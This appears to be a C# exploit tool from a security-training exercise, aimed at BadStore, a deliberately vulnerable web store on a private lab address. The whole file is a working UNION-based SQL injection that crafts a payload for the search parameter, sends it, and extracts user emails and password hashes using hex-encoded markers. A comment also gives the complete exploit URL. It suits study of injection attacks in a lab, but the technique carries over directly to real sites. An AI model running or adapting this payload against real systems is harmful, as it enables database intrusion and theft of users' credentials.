using System;
using System.Linq;
using System.Text.RegularExpressions;
using System.IO;
using System.Net;

namespace FuzzingTools
{
    public static class SqlInjectionExploiter
    {
        public static void UnionInjector()
        {

            string frontMarker = "FrOnTMaRKer";
            string middleMarker = "mIdDLEMRker";
            string endMarker = "eNdMaRker";
            string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
            string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
            string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));


            //string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";
            string url = "http://192.168.56.100/cgi-bin/badstore.cgi";

            /*Working exploit
             * http://192.168.56.100/cgi-bin/badstore.cgi?searchquery=fdsa%27%20UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(%27Username:%20%27,
             * IFNULL(CAST(email+AS+CHAR),0x20),%27%20Password:%20%27,IFNULL(CAST(passwd+AS+CHAR),0x20),%27%20end%27)
             * %20FROM%20badstoredb.userdb%23&action=search&x=21&y=9
             */

            string payload = "fdsa' UNION+ALL+SELECT+";
            payload += "NULL,NULL,NULL,CONCAT(0x" + frontHex + ",IFNULL(CAST(email+AS";
            payload += "+CHAR),0x20),0x" + middleHex + ",IFNULL(CAST(passwd+AS";
            payload += "+CHAR),0x20),0x" + endHex + ") FROM badstoredb.userdb#";

            url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search&x=21&y=9";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            string response = String.Empty;

            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            Console.WriteLine("Response length: " + response.Length.ToString());

            //(FrOnTMaRKer)(.*?)(mIdDLEMRker)(.*?)(eNdMaRker)
            Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
            MatchCollection matches = payloadRegex.Matches(response);

            foreach (Match item in matches)
            {
                System.Console.WriteLine("Username: {0} \t Password hash: {1}", item.Groups[1].Value, item.Groups[2].Value);
            }

        }
    }
}

